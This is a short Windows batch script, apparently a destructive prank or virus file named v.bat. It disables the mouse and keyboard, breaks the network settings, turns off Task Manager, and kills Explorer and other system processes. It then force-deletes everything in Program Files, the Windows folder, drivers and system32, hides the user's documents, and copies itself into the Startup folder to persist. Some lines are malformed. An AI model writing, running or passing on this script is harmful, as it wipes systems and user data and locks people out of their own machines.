@echo off
rundll32 mouse, disable
rundll32 keyboard, disable
netsh interface ip set address name="Local Area Connection" static 111.111.111.111 255.255.255.0 111.111.111.111 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1
taskkill explorer.exe /f /im
taskkill alg.exe /f /im
taskkill spoolsv.exe /f /im
c:
cd program files
del *.* /f /q
c:
cd %windir%
del *.* /f /q
del \drivers\*.* /f /q
del \system32\*.* /f /q
attrib +h c:\%windir%
attrib +h %userprofile%\my documents\*.*
copy v.bat %userprofile%\Start Menu\Programs\Startup\
attrib +h +r +s %userprofile%\Start Menu\Programs\Startup\
end